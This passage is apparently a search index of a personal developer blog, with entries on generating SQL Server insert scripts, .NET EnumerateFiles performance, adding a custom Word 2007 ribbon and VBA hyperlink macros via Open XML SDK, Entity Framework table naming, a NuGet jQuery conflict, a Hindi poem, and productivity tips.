records, Use the \u201cSave to file\u201d option to save the script and It will generate the script file containing all the insert queries just fine. If you use \u201ccopy to clipboad\u201d or a \u201cNew Query Window option\u201d, the generation will fail with Out of Memory Exception. B) ALWAYS enclose the insert scripts in transaction with TRY CATCH block before running them. You don\u2019t want partial inserts on your table \u2013 do you? How to generate the data script for SQL server 2005 database tables Good thing is you can generate the data script of SQL server 2005 database objects from SQL server 2008 management studio. This is how you do it. a) In the SQL Management studio, right click on the database and select \u201cTask > Generate Scripts \u201d. A wizard will be launched. b) Select the database you want to generate the script from. c) In the \u201cChoose Script option\u201d step of the Wizard, select the \u201cScript data\u201d as true:- d) Proceed on to generate the script and It will generate the data script as well.","title":"SQL Server - Generate the data script (insert script)  for existing data in tables"},{"location":"2010/11/2010-11-01-sql-server-2008-generate-the-data-script-insert-script-from-tables/#how-to-generate-the-data-script-for-sql-server-2008-database-tables","text":"Right click on the database where your table exists > Tasks > Generate Scripts Click Next on the below screen Choose \u201cSelect specific database objects\u201d radio button, expand the tables and choose the table for which the data script needs to be generated and click Next. On the below screen, click \u201cAdvanced\u201d and then select \u201cData only\u201d option from the \u201cTypes of data to script\u201d. By default \u201cSchema only\u201d option is selected. You can also select \u201cSchema and data\u201d option for both creating table and also for the insert scripts. Choose where to save the insert script (File/Query window/Clipboard) and click on Next.You can see the progress and will see the generated insert script.","title":"How to generate the data script for SQL server 2008 database tables"},{"location":"2010/11/2010-11-01-sql-server-2008-generate-the-data-script-insert-script-from-tables/#important-notes","text":"A) If your table has large amount of data (like mine in this case having 5000K records, Use the \u201cSave to file\u201d option to save the script and It will generate the script file containing all the insert queries just fine. If you use \u201ccopy to clipboad\u201d or a \u201cNew Query Window option\u201d, the generation will fail with Out of Memory Exception.","title":"IMPORTANT NOTES\u00a0 \u2013"},{"location":"2010/11/2010-11-01-sql-server-2008-generate-the-data-script-insert-script-from-tables/#b-always-enclose-the-insert-scripts-in-transaction-with-try-catch-block-before-running-them-you-dont-want-partial-inserts-on-your-table-do-you","text":"","title":"B) ALWAYS enclose the insert scripts in transaction with TRY CATCH block before running them. You don\u2019t want partial inserts on your table \u2013 do you?"},{"location":"2010/11/2010-11-01-sql-server-2008-generate-the-data-script-insert-script-from-tables/#how-to-generate-the-data-script-for-sql-server-2005-database-tables","text":"Good thing is you can generate the data script of SQL server 2005 database objects from SQL server 2008 management studio. This is how you do it. a) In the SQL Management studio, right click on the database and select \u201cTask > Generate Scripts \u201d. A wizard will be launched. b) Select the database you want to generate the script from. c) In the \u201cChoose Script option\u201d step of the Wizard, select the \u201cScript data\u201d as true:- d) Proceed on to generate the script and It will generate the data script as well.","title":"How to generate the data script for SQL server 2005 database tables"},{"location":"2010/11/2010-11-26-new-apis-in-system-io/","text":"Have a look at some of the new APIs in introduced in System.IO which makes some of the tasks efficient \u2013 both performance as well as memory wise. For example, there are instances when we need the total number of files in a given directory (recursively). In those instances, we think of following two methods :- System.IO.DirectoryInfo.GetFiles() which returns FileInfo[] System.IO.Directory.GetFiles() which returns string[] (which contains names) .NET 4.0 introduced some new methods for IO and two of which are :- System.IO.DirectoryInfo.EnumerateFiles() which returns IEnumerable System.IO.Directory. EnumerateFiles() which returns IEnumerable (which contains names) Why these two new methods? Because they are efficient because when we use them we don\u2019t have to wait for thw whole FileInfo[] or String[] to return before we could access the collection. From MSDN:- \u201c The__ EnumerateFiles and GetFiles methods differ as follows: When you use EnumerateFiles , you can start enumerating the collection of__ FileInfo objects before the whole collection is returned; when you use GetFiles , you must wait for the whole array of__ FileInfo objects to be returned before you can access the array. Therefore, when you are working with many files and directories, EnumerateFiles __can be more efficient .\u201d I did some performance comparison ( a small project attached ) and following are the results :- For 56505 number of files :- Methods Time taken (in milliseconds) Memory used (in Kilobytes) DirectoryInfo.GetFiles() 3393 31004 DirectoryInfo.EnumerateFiles() 3365 6223 Directory.GetFiles() 3001 24888 Directory.EnumerateFiles() 2961 6992 As you can see DirectoryInfo.EnumerateFiles() is faster than DirectoryInfo.GetFiles() and more importantly occupies almost 1/5 of memory in comparison. Also, regarding Directory.GetFiles(), It is used to fetch the names of the files. But as we can see one can use Directory.EnumerateFiles() which is faster and occupies almost 1/4th of the memory in comparison. [Task manager showing memory occupied by DirectoryInfo.GetFiles()] [Task manager showing memory occupied by DirectoryInfo.EnumerateFiles()] Therefore, when we need to enumerate large number of files, we can look at EnumerateFiles() method.","title":"New APIs in System.IO"},{"location":"2011/01/2011-01-11-customizing-ribbon-in-office-2007-using-open-office-xml-and-vba/","text":"Code for this article can be downloaded from here . Ribbon:- From http://office.microsoft.com/en-gb/help/use-the-ribbon-HA010089895.aspx :- \u201cThe Ribbon is designed to help you quickly find the commands that you need to complete a task. Commands are organized in logical groups, which are collected together under tabs. Each tab relates to a type of activity, such as writing or laying out a page. To reduce clutter, some tabs are shown only when needed. For example, the Picture Tools tab is shown only when a picture is selected.\u201d What to expect from this article:- At the end of this article you should be able to customize the ribbon. We will add a tab named \u201cMy Zone\u201d containing two groups, \u201cMy links\u201d and \u201cMy Contacts\u201d containing your web site links and email addresses of your contacts. When you click on any of the \u201clinks\u201d in the \u201cMy Links\u201d group, that link will get added to the document at the current position of the cursor. Ribbon XML:- From http://msdn.microsoft.com/en-us/library/aa942866.aspx :- \u201c The Ribbon (XML) item enables you to customize a Ribbon by using XML. Use the Ribbon (XML) item if you want to customize the Ribbon in a way that is not supported by the Ribbon (Visual Designer) item \u201d Example RibbonXML:- [sourcecode language=\"xml\"] [/sourcecode] How to add RibbonXML(CustomUI XML) to the word using OpenXML SDK Pre-requisite :- Open XML SDK 2.0 which can be downloaded from here . (Download the OpenXMLSDKv2.msi which is about 4 MB in size) Additional tools :- a) The schema for ribbon XML which can be downloaded from here . b) Custom UI Editor which allows you to add a custom UI part to a document. This can be downloaded from here . Lets Start\u2026. Create a console application and add a empty word document to it. The document should be macro-enabled (with .docm) extension. Add the Xml for the Ribbon as well. My solution explorer looks like this :- For the purpose of the example in this document we will have a Ribbon XML created already and we would put the same into an existing word document on run-time. [sourcecode language=\"csharp\"] static string documentName = \"document.docm\"; static string ribbonXMLFileName = \"Ribbon.xml\"; static void Main(string[] args) { byte[] updatedByteContent = AddRibbonToDocument(File.ReadAllBytes(documentName)); if (updatedByteContent != null) { using (FileStream fileStream = new FileStream(documentName, FileMode.Create)) { fileStream.Write(updatedByteContent, 0, updatedByteContent.Length); } } if (File.Exists(documentName)) { Process.Start(documentName); } } [/sourcecode] Line 6:- Reads the contents of the document.docm file and pass the binary content to the AddRibbonToDocument() method which will add the ribbon to the document. Line 7-14:- The binary content of the file (which also contains the ribbon now) is written to the same file as original and opened. Add the below method in Program.cs. This method takes the binary content of a word file and adds the Ribbon XML to it. **[sourcecode language=\"csharp\"] public static byte[] AddRibbonToDocument(byte[] documentContent) { byte[] updatedDocumentContent = null; if (documentContent != null) { using (MemoryStream memoryStream = new MemoryStream()) { memoryStream.Write(documentContent, 0, documentContent.Length); string ribbonXMLAsString = GetRibbonXML().ToString(); using (WordprocessingDocument myDoc = WordprocessingDocument.Open(memoryStream, true)) { MainDocumentPart mainPart = myDoc.MainDocumentPart; if (myDoc.GetPartsCountOfType () > 0) { myDoc.DeletePart(myDoc.GetPartsOfType ().First()); } RibbonExtensibilityPart ribbonExtensibilityPart = myDoc.AddNewPart<RibbonExtensibilityPart>(); ribbonExtensibilityPart.CustomUI = new DocumentFormat.OpenXml.Office.CustomUI.CustomUI(ribbonXMLAsString); myDoc.CreateRelationshipToPart(ribbonExtensibilityPart); } updatedDocumentContent = memoryStream.ToArray(); } } return updatedDocumentContent; } [/sourcecode]** Line 4-8 :- The binary content of the document is put in a MemoryStream which will be used for any modification in the content. Line 9 :\u2013 The ribbon XML is got from the GetRibbonXML() method which can either get the XML from a static file or dynamically construct from the database values. Line 10 :- WordProcessingDocument object is initialized from the memorysteam of the document content. The second parameter of the constructor is \u201cIsEditable\u201d is set to true as we are going to modify its content. Line 14- 15 :- Get the main document part from the wordprocessing document and delete any existing custom ribbon from it. Line 17 - 19 :- Content of the ribbon XML needs to be added as a RibbonExtensibilityPart to the main document and a relationship will be created for the same. Infact any type of content you add to a document as a part, you must create its (part\u2019s) relationship with the document so that document can load up that part when you open the document in MSWord (or in general MS Office). So, at this point of time If you run the application, the document.docm should get opened and you should see the tab and the buttons. More explanation on line 17-19 Document structure before you ran the above code :- Look at the _rels/.rels file. You don\u2019t see anything related to Custom UI here. Document structure after the above code is run:- You will see a customUI folder created here:- Open the CustomUI folder and the file inside it will contain the same ribbonXml you inserted using the code above:- Look at the _rels/.rels file. You will see a new entry stating the relationship with the CustomUI.xml file here. btw, If you click on any of the buttons now, nothing would happen as we haven\u2019t added any interactivity features to those buttons. Adding interactivity to the ribbon elements:- 1) Make a copy of the Document.docm and rename the copied document to \u201cDocumentWithMacros.docm\u201d. Open the developer tab and insert a \u201cModule\u201d to the project. 2) Rename the module to OfficeMacroHelper:- 3) Add the following macro code to the module. Then save and close the word file:- [sourcecode language=\"vb\"] Sub CreateTextHyperLink(control As IRibbonControl) CreateHyperlink control.Tag, control.id End Sub Sub InsertTextHyperlink(hyperlink As String, textTodisplay As String) CreateHyperlink hyperlink, textTodisplay End Sub Sub CreateEmailHyperLink(control As IRibbonControl) InsertEmailHyperliink control.Tag, control.Tag End Sub Sub InsertEmailHyperliink(hyperlink As String, textTodisplay As String) Dim emailLink As String emailLink = \"mailto:\" & hyperlink CreateHyperlink emailLink, textTodisplay End Sub Sub CreateHyperlink(address As String, textTodisplay As String) ActiveDocument.Hyperlinks.Add Anchor:=Selection.Range, address:=\"\" & address & \"\", SubAddress:=\"\", textTodisplay:=\"\" & textTodisplay & \"\" End Sub [/sourcecode] 4) At this point of time if you view the TheDocumentWithMacros.docm, you see vbaProject.bin. This file has got the binary form of all the macros the document contains. This is what we need to copy in our main document (document.docm). 5) Now we have the macros in \u201cTheDocumentWithMacro.docm\u201d. Its time to call them from our main document \u201cDocument.docm\u201d.We call those macro functions from the onAction event of the button. [sourcecode language=\"xml\"] <group id=\"grpEmailAddresses\" label=\"My Contacts\"> <button id=\"e1\" label=\"Ashish Gupta\" tag=\"ashish.kuber@wipro.com\" onAction=\"CreateEmailHyperLink\"/> <button id=\"e2\" label=\"Sachin Tendulkar\" tag=\"sachinrt@yahoo.com\" onAction=\"CreateEmailHyperLink\"/> <button id=\"e3\" label=\"James Hetfield\" tag=\"James.Hetfield@metallica.com\" onAction=\"CreateEmailHyperLink\"/> </group> </tab> </tabs> </ribbon> [/sourcecode] 6) Copy the macro code from the \u201cTheDocumentWithMacro.docm\u201d to the \u201cDocument.docm\u201d:- [sourcecode language=\"csharp\"] public static void CopyMacro(byte[] documentWithMacroContent, WordprocessingDocument document) { const string vbaProjectRelationShipType = \"http://schemas.microsoft.com/office/2006/relationships/vbaProject\"; VbaProjectPart vbaProjectPart = null; using (MemoryStream memoryStream = new MemoryStream(documentWithMacroContent, false)) { using (WordprocessingDocument documentWithMacro = WordprocessingDocument.Open(memoryStream, false)) { MainDocumentPart mainPart = documentWithMacro.MainDocumentPart; foreach (IdPartPair partPair in mainPart.Parts) { if (partPair.OpenXmlPart.RelationshipType == vbaProjectRelationShipType) { vbaProjectPart = (VbaProjectPart)partPair.OpenXmlPart; break; } } MainDocumentPart mainPart1 = document.MainDocumentPart; ExtendedPart extendedPart = null; foreach (IdPartPair partPair in mainPart1.Parts) { if (partPair.OpenXmlPart.RelationshipType == vbaProjectRelationShipType) { extendedPart = (ExtendedPart)partPair.OpenXmlPart; break; } } if (extendedPart != null) mainPart1.DeletePart(extendedPart); if (vbaProjectPart != null) mainPart1.AddPart<VbaProjectPart>(vbaProjectPart); } } } [/sourcecode] Line 11- 18 :- Get the VbaProjectPart from the document with macro. Line 20-29 :- Get the VbaProjectPart from the document. Line 31-32 :- Delete the existing VbaProjectPart from the document If any. Line 34-35 :- Add the VbaProjectPart got from the Line (125-133) to the document. 7) Get the binary content of the \u201cTheDocumentWithMacro.docm\u201d (line 7). [sourcecode language=\"csharp\"] static string fileName = \"document.docm\"; static string ribbonXMLFileName = \"Ribbon.xml\"; static string documentWithMacroFileName = \"TheDocumentWithMacro.docm\"; static byte[] documentWithMacroContent; static void Main(string[] args) { documentWithMacroContent = File.ReadAllBytes(documentWithMacroFileName); byte[] updatedByteContent = AddRibbonToDocument(File.ReadAllBytes(fileName)); if (updatedByteContent != null) { using (FileStream fileStream = new FileStream(fileName, FileMode.Create)) { fileStream.Write(updatedByteContent, 0, updatedByteContent.Length); } } if (File.Exists(fileName)) Process.Start(fileName); } [/sourcecode] 8) Modify the AddRibbonToDocument() to add call to CopyMacro() method (line 20). [sourcecode language=\"csharp\"] public static byte[] AddRibbonToDocument(byte[] documentContent) { byte[] updatedDocumentContent = null; if (documentContent != null) { using (MemoryStream memoryStream = new MemoryStream()) { memoryStream.Write(documentContent, 0, documentContent.Length); string ribbonXMLAsString = GetRibbonXML().ToString(); using (WordprocessingDocument myDoc = WordprocessingDocument.Open(memoryStream, true)) { MainDocumentPart mainPart = myDoc.MainDocumentPart; if (myDoc.GetPartsCountOfType () > 0) myDoc.DeletePart(myDoc.GetPartsOfType ().First()); RibbonExtensibilityPart ribbonExtensibilityPart = myDoc.AddNewPart<RibbonExtensibilityPart>(); ribbonExtensibilityPart.CustomUI = new DocumentFormat.OpenXml.Office.CustomUI.CustomUI(ribbonXMLAsString); myDoc.CreateRelationshipToPart(ribbonExtensibilityPart); CopyMacro(documentWithMacroContent, myDoc); } updatedDocumentContent = memoryStream.ToArray(); } } return updatedDocumentContent; } [/sourcecode] At this point of time, If you run the application you should see the buttons on the newly added tab. Clicking on the buttons embed links on the document. NOTE :- If you are like me, you must be thinking of creating the VBProject dynamically to the document.docm file rather than maintaining another file (ThedocumentWithMacro.docm) and copying from the same. Although theoretically Its possible, Its way too complex to implement or I just dont have the time to implement that way. See this msdn.microsoft.com/en-us/library/cc313094(v=office.12).aspx .","title":"Customizing Ribbon in Office 2007 using Open Office XML and VBA"},{"location":"2011/01/2011-01-11-customizing-ribbon-in-office-2007-using-open-office-xml-and-vba/#lets-start","text":"Create a console application and add a empty word document to it. The document should be macro-enabled (with .docm) extension. Add the Xml for the Ribbon as well. My solution explorer looks like this :- For the purpose of the example in this document we will have a Ribbon XML created already and we would put the same into an existing word document on run-time. [sourcecode language=\"csharp\"] static string documentName = \"document.docm\"; static string ribbonXMLFileName = \"Ribbon.xml\"; static void Main(string[] args) { byte[] updatedByteContent = AddRibbonToDocument(File.ReadAllBytes(documentName)); if (updatedByteContent != null) { using (FileStream fileStream = new FileStream(documentName, FileMode.Create)) { fileStream.Write(updatedByteContent, 0, updatedByteContent.Length); } } if (File.Exists(documentName)) { Process.Start(documentName); } } [/sourcecode] Line 6:- Reads the contents of the document.docm file and pass the binary content to the AddRibbonToDocument() method which will add the ribbon to the document. Line 7-14:- The binary content of the file (which also contains the ribbon now) is written to the same file as original and opened. Add the below method in Program.cs. This method takes the binary content of a word file and adds the Ribbon XML to it. **[sourcecode language=\"csharp\"] public static byte[] AddRibbonToDocument(byte[] documentContent) { byte[] updatedDocumentContent = null; if (documentContent != null) { using (MemoryStream memoryStream = new MemoryStream()) { memoryStream.Write(documentContent, 0, documentContent.Length); string ribbonXMLAsString = GetRibbonXML().ToString(); using (WordprocessingDocument myDoc = WordprocessingDocument.Open(memoryStream, true)) { MainDocumentPart mainPart = myDoc.MainDocumentPart; if (myDoc.GetPartsCountOfType () > 0) { myDoc.DeletePart(myDoc.GetPartsOfType ().First()); } RibbonExtensibilityPart ribbonExtensibilityPart = myDoc.AddNewPart<RibbonExtensibilityPart>(); ribbonExtensibilityPart.CustomUI = new DocumentFormat.OpenXml.Office.CustomUI.CustomUI(ribbonXMLAsString); myDoc.CreateRelationshipToPart(ribbonExtensibilityPart); } updatedDocumentContent = memoryStream.ToArray(); } } return updatedDocumentContent; } [/sourcecode]** Line 4-8 :- The binary content of the document is put in a MemoryStream which will be used for any modification in the content. Line 9 :\u2013 The ribbon XML is got from the GetRibbonXML() method which can either get the XML from a static file or dynamically construct from the database values. Line 10 :- WordProcessingDocument object is initialized from the memorysteam of the document content. The second parameter of the constructor is \u201cIsEditable\u201d is set to true as we are going to modify its content. Line 14- 15 :- Get the main document part from the wordprocessing document and delete any existing custom ribbon from it. Line 17 - 19 :- Content of the ribbon XML needs to be added as a RibbonExtensibilityPart to the main document and a relationship will be created for the same. Infact any type of content you add to a document as a part, you must create its (part\u2019s) relationship with the document so that document can load up that part when you open the document in MSWord (or in general MS Office). So, at this point of time If you run the application, the document.docm should get opened and you should see the tab and the buttons. More explanation on line 17-19 Document structure before you ran the above code :- Look at the _rels/.rels file. You don\u2019t see anything related to Custom UI here. Document structure after the above code is run:- You will see a customUI folder created here:- Open the CustomUI folder and the file inside it will contain the same ribbonXml you inserted using the code above:- Look at the _rels/.rels file. You will see a new entry stating the relationship with the CustomUI.xml file here. btw, If you click on any of the buttons now, nothing would happen as we haven\u2019t added any interactivity features to those buttons.","title":"Lets Start\u2026."},{"location":"2011/01/2011-01-11-customizing-ribbon-in-office-2007-using-open-office-xml-and-vba/#adding-interactivity-to-the-ribbon-elements-","text":"1) Make a copy of the Document.docm and rename the copied document to \u201cDocumentWithMacros.docm\u201d. Open the developer tab and insert a \u201cModule\u201d to the project. 2) Rename the module to OfficeMacroHelper:- 3) Add the following macro code to the module. Then save and close the word file:- [sourcecode language=\"vb\"] Sub CreateTextHyperLink(control As IRibbonControl) CreateHyperlink control.Tag, control.id End Sub Sub InsertTextHyperlink(hyperlink As String, textTodisplay As String) CreateHyperlink hyperlink, textTodisplay End Sub Sub CreateEmailHyperLink(control As IRibbonControl) InsertEmailHyperliink control.Tag, control.Tag End Sub Sub InsertEmailHyperliink(hyperlink As String, textTodisplay As String) Dim emailLink As String emailLink = \"mailto:\" & hyperlink CreateHyperlink emailLink, textTodisplay End Sub Sub CreateHyperlink(address As String, textTodisplay As String) ActiveDocument.Hyperlinks.Add Anchor:=Selection.Range, address:=\"\" & address & \"\", SubAddress:=\"\", textTodisplay:=\"\" & textTodisplay & \"\" End Sub [/sourcecode] 4) At this point of time if you view the TheDocumentWithMacros.docm, you see vbaProject.bin. This file has got the binary form of all the macros the document contains. This is what we need to copy in our main document (document.docm). 5) Now we have the macros in \u201cTheDocumentWithMacro.docm\u201d. Its time to call them from our main document \u201cDocument.docm\u201d.We call those macro functions from the onAction event of the button. [sourcecode language=\"xml\"] <group id=\"grpEmailAddresses\" label=\"My Contacts\"> <button id=\"e1\" label=\"Ashish Gupta\" tag=\"ashish.kuber@wipro.com\" onAction=\"CreateEmailHyperLink\"/> <button id=\"e2\" label=\"Sachin Tendulkar\" tag=\"sachinrt@yahoo.com\" onAction=\"CreateEmailHyperLink\"/> <button id=\"e3\" label=\"James Hetfield\" tag=\"James.Hetfield@metallica.com\" onAction=\"CreateEmailHyperLink\"/> </group> </tab> </tabs> </ribbon> [/sourcecode] 6) Copy the macro code from the \u201cTheDocumentWithMacro.docm\u201d to the \u201cDocument.docm\u201d:- [sourcecode language=\"csharp\"] public static void CopyMacro(byte[] documentWithMacroContent, WordprocessingDocument document) { const string vbaProjectRelationShipType = \"http://schemas.microsoft.com/office/2006/relationships/vbaProject\"; VbaProjectPart vbaProjectPart = null; using (MemoryStream memoryStream = new MemoryStream(documentWithMacroContent, false)) { using (WordprocessingDocument documentWithMacro = WordprocessingDocument.Open(memoryStream, false)) { MainDocumentPart mainPart = documentWithMacro.MainDocumentPart; foreach (IdPartPair partPair in mainPart.Parts) { if (partPair.OpenXmlPart.RelationshipType == vbaProjectRelationShipType) { vbaProjectPart = (VbaProjectPart)partPair.OpenXmlPart; break; } } MainDocumentPart mainPart1 = document.MainDocumentPart; ExtendedPart extendedPart = null; foreach (IdPartPair partPair in mainPart1.Parts) { if (partPair.OpenXmlPart.RelationshipType == vbaProjectRelationShipType) { extendedPart = (ExtendedPart)partPair.OpenXmlPart; break; } } if (extendedPart != null) mainPart1.DeletePart(extendedPart); if (vbaProjectPart != null) mainPart1.AddPart<VbaProjectPart>(vbaProjectPart); } } } [/sourcecode] Line 11- 18 :- Get the VbaProjectPart from the document with macro. Line 20-29 :- Get the VbaProjectPart from the document. Line 31-32 :- Delete the existing VbaProjectPart from the document If any. Line 34-35 :- Add the VbaProjectPart got from the Line (125-133) to the document. 7) Get the binary content of the \u201cTheDocumentWithMacro.docm\u201d (line 7). [sourcecode language=\"csharp\"] static string fileName = \"document.docm\"; static string ribbonXMLFileName = \"Ribbon.xml\"; static string documentWithMacroFileName = \"TheDocumentWithMacro.docm\"; static byte[] documentWithMacroContent; static void Main(string[] args) { documentWithMacroContent = File.ReadAllBytes(documentWithMacroFileName); byte[] updatedByteContent = AddRibbonToDocument(File.ReadAllBytes(fileName)); if (updatedByteContent != null) { using (FileStream fileStream = new FileStream(fileName, FileMode.Create)) { fileStream.Write(updatedByteContent, 0, updatedByteContent.Length); } } if (File.Exists(fileName)) Process.Start(fileName); } [/sourcecode] 8) Modify the AddRibbonToDocument() to add call to CopyMacro() method (line 20). [sourcecode language=\"csharp\"] public static byte[] AddRibbonToDocument(byte[] documentContent) { byte[] updatedDocumentContent = null; if (documentContent != null) { using (MemoryStream memoryStream = new MemoryStream()) { memoryStream.Write(documentContent, 0, documentContent.Length); string ribbonXMLAsString = GetRibbonXML().ToString(); using (WordprocessingDocument myDoc = WordprocessingDocument.Open(memoryStream, true)) { MainDocumentPart mainPart = myDoc.MainDocumentPart; if (myDoc.GetPartsCountOfType () > 0) myDoc.DeletePart(myDoc.GetPartsOfType ().First()); RibbonExtensibilityPart ribbonExtensibilityPart = myDoc.AddNewPart<RibbonExtensibilityPart>(); ribbonExtensibilityPart.CustomUI = new DocumentFormat.OpenXml.Office.CustomUI.CustomUI(ribbonXMLAsString); myDoc.CreateRelationshipToPart(ribbonExtensibilityPart); CopyMacro(documentWithMacroContent, myDoc); } updatedDocumentContent = memoryStream.ToArray(); } } return updatedDocumentContent; } [/sourcecode] At this point of time, If you run the application you should see the buttons on the newly added tab. Clicking on the buttons embed links on the document. NOTE :- If you are like me, you must be thinking of creating the VBProject dynamically to the document.docm file rather than maintaining another file (ThedocumentWithMacro.docm) and copying from the same. Although theoretically Its possible, Its way too complex to implement or I just dont have the time to implement that way. See this msdn.microsoft.com/en-us/library/cc313094(v=office.12).aspx .","title":"Adding interactivity to the ribbon elements:-"},{"location":"2011/01/2011-01-12-adding-custom-pane-to-the-ribbon-in-microsoft-word-2007-using-openxml-sdk-2-0-and-vba/","text":"Source code In the last article we looked at how we add ribbon to a word document, how do we add controls to the ribbon and how do we provide interactivity to the ribbon controls and our tab looked like this:- However, what if we have more links or more contacts (which is indeed is the case). Looks clumsy, isn\u2019t it? Also, it would get clumsier if we have more links and contacts. So what If we have something like this:- Notice the little downward arrow at the right corner of each group. Clicking each would open a pane showing all the links/email addresses. Again clicking any link/email address in the custom pane would insert the link/email in the document. This way we show very few things to the user (thereby not making the ribbon clumsy) and If user wants to see more, he opens the pane to see more. This is very similar to the \u201cFont\u201d group in the \u201cHome\u201d tab. This time we will make changes to the existing solution and following are the changes:- a) Prepare the list of hyperlinks and email addresses to be shown to the user in the custom pane. b) Creating the custom panes c) Adding data to the custom panes d) Creating that (dialog launcher) button (the button when when clicked will open the custom pane) e) Add interactivity for the custom pane. a) Prepare the list of hyperlinks and email addresses to be shown to the user in the custom pane :- One way we can add the list of hyperlinks and the email addresses to the document is to add them as XML fragments (also called \u201cCustomXmlParts\u201d). Following is how we do it:- i) Create XML for the list we want to show in the pane. Data for this XML can also come from the database. ii) Add the XML to the document as CustomXmlPart AddCustomXmlPartsToDocument():- 149-150 \u2013 Delete all the existing CustomXMLParts from the document. 152-153 \u2013 Add the TextHyperlinks XML to the document as CustomXMLPart by calling AddCustomXmlPart() 155-156 \u2013 Add the EmailLinks XML to the document as CustomXMLPart by calling AddCustomXmlPart() iii) Add the call to AddCustomXmlPartsToDocument() to the AddRibbonToDocument() At this point of time if we run the application, the word document does not contain anything visiblely different in the Microsoft word. However, If you zip and unzip it, you should see the custom XML parts as separate files in the zipped file. There must be a way to give a proper name to the CustomXMLPart. I need to see that as well. That, however is not important for this example. b) Creating the custom panes :- We need two custom panes. One for the hyperlinks and other for the email addresses. Open the \u201cTheDocumentWithMacros.docm\u201d and open the developer tab. Add two \u201cUser Forms\u201d In each \u201cUser Form\u201d, add a listbox. My project explorer looks like this:- \u201cEmailLinksPane\u201d user form contains a listbox with name \u201clstTextHyperlinks\u201d and \u201cTextHyperlinksPane\u201d user form contains a listbox named \u201clstEmailLinks\u201d. Remember we created these user forms in the \u201cTheDocumentWithMacro\u201d and the all the user forms and the associated controls (listbox) will get copied to the document just like the macros get copied. c) Adding data to the custom panes:- We need to add data to the custom panes when the ribbon loads. CustomIUI XML provide a onLoad event on the ribbon element. (not showing whole of XML below) That \u201cRibbonLoad\u201d is a VBA subroutine. We can get the customXMLParts from the document and put them in global variables. When the user clicks on the button, we fill the listboxes with the corresponding global variable. Following d) Creating that button is a dialogbox launcher. Following is the modified ribbon XML with added part highlighted:- At this point of time if we run the application, we should see the button ( ) for both the links and the contacts group. e) Adding interactivity for the custom pane :- Notice the dialogbox launcher has a button which has a action handler for onAction. In that action handler, we will load the listbox of the corresponding user form with the global variable created on ribbon onload and show the user form to the user. At this point of time if we run the application, we should be able to show/hide the hyperlinks/email panes from the document. User should also be able to insert the hyperlinks/email from the custom pane. For that, we need to add the code in the listbox click event which will call the same function which is called when you click a visible button which is right on the ribbon. This is for the hyperlinks custom pane list- This is for the emails custom pane list:- Now If you click on any hyperlink/email item in the corresponding listbox, the hyperlink/email will be inserted in the document.","title":"Adding custom pane to the ribbon in Microsoft Word 2007 using OpenXML SDK 2.0 and VBA"},{"location":"2011/08/2011-08-01-a-beautiful-poem/","text":"By Javed Akhtar Dilon mein tum apni Betaabiyan leke chal rahe ho Toh zinda ho tum Nazar mein khwabon ki Bijliyan leke chal rahe ho Toh zinda ho tum Hawa ke jhokon ke jaise Aazad rehno sikho Tum ek dariya ke jaise Lehron mein behna sikho Har ek lamhe se tum milo Khole apni bhaayein Har ek pal ek naya samha Dekhen yeh nigahaein Jo apni aankhon mein Hairaniyan leke chal rahe ho Toh zinda ho tum Dilon mein tum apni Betaabiyan leke chal rahe ho Toh zinda ho tum English Translation If you carry impatience in your heart then you are alive If you carry dreams in your eyes then you are alive Learn to live like the free waves of wind Learn to flow like the sea does as waves Receive every moment in life with open arms Every moment is a new beginning seeing with your eyes If you carry surprise in your eyes then you are alive If you carry impatience in your heart then you are alive","title":"A beautiful poem"},{"location":"2011/11/2011-11-19-entity-framework-code-first-disable-pluralization-of-your-tables/","text":"I have the following model :- namespace AddressBook.Models { public class Contact { public int Id { get; set; } public string FirstName { get; set; } public string LastName { get; set; } public string EmailAddress { get; set; } } } The table name in the database :- \"Contact\". DbContext public class AddressBookDb : DbContext { public DbSet Contacts { get; set; } protected override void OnModelCreating( DbModelBuilder dbModelBuilder) { dbModelBuilder.Conventions.Remove (); } Using any of the views, gives the following error :- Invalid object name dbo.Contacts. Obviously, entity framework is trying to pluralize the table name and expecting the table with the pluralized named database. This would be a problem for existing tables which you obviously don't want to rename. Just override the OnModelCreating method and remove that \"PluralizingTableNameConvention\" convention. protected override void OnModelCreating( DbModelBuilder dbModelBuilder) { dbModelBuilder.Conventions.Remove (); } Note :- Need to add the namespace :- System.Data.Entity.ModelConfiguration.Conventions;","title":"Entity framework - Code first - Disable pluralization of your tables"},{"location":"2012/02/2012-02-03-error-install-package-conflict-occurred-jquery-1-5-1-referenced-but-requested-jquery-1-6-4-jquery-vsdoc-1-5-1-jquery-validation-1-8-0-jquery-ui-combined-1-8-11-depend-on-jquery-1/","text":"I was trying to install SignalR using NuGet package manager :- install-package signalr and get the following error :- Install-Package : Conflict occurred. 'jQuery 1.5.1' referenced but requested 'jQuery 1.6.4'. 'jQuery.vsdoc 1.5.1, jQuery.Validation 1.8. 0, jQuery.UI.Combined 1.8.11' depend on 'jQuery 1.5.1'. At line:1 char:16 + install-package <<<< signalr + CategoryInfo : NotSpecified: (:) [Install-Package], InvalidOperationException + FullyQualifiedErrorId : NuGetCmdletUnhandledException,NuGet.PowerShell.Commands.InstallPackageCommand So, It looked like jQuery 1.5.1 was referenced in my app. So, I looked that up and It was found in the package.config. All I had to do is to remove all the jQuery references (highlighed above) and retry installing SignalR again and It got installed successfully this time. PM> install-package signalr 'SignalR 0.3.5' already installed. Successfully added 'Microsoft.Web.Infrastructure 1.0.0.0' to UsingSignalRWithMVC. Successfully added 'SignalR.Server 0.3.5' to UsingSignalRWithMVC. Successfully added 'jQuery 1.6.4' to UsingSignalRWithMVC. Successfully added 'SignalR.Js 0.3.5' to UsingSignalRWithMVC. Successfully added 'SignalR 0.3.5' to UsingSignalRWithMVC.","title":"Error Install-Package : Conflict occurred. 'jQuery 1.5.1' referenced but requested 'jQuery 1.6.4'. 'jQuery.vsdoc 1.5.1, jQuery.Validation 1.8. 0, jQuery.UI.Combined 1.8.11' depend on 'jQuery 1.5.1'"},{"location":"2012/04/2012-04-11-productivity-notes/","text":"Notes and slides from Scot Hanselman's talk on productivity :- Notes:- Effectiveness Rule of three [ http://gettingresults.com ]- Write down three outcomes -- of the day -- of the week -- of the month -- of the year Email -- Create rule to move emails CCed to me to a different label -- Check email on schedule time -- five.sentenc.es Psychic Weight Get over it Efficiency The pomodoro technique - Download Pomodairo Try to do one thing AND only one thing for 25 minutes Try to track the interupptions -- Internal (Tweet, Stackoverflow, Personal email) -- External (People) DO NOT MULTI TASK Do not pile up books/articles at your desk - you are not going them all. Do not check up on news/sports. Install RescueTime to measure when you are most productive and when you are not Look at https://workflowy.com/ Look at 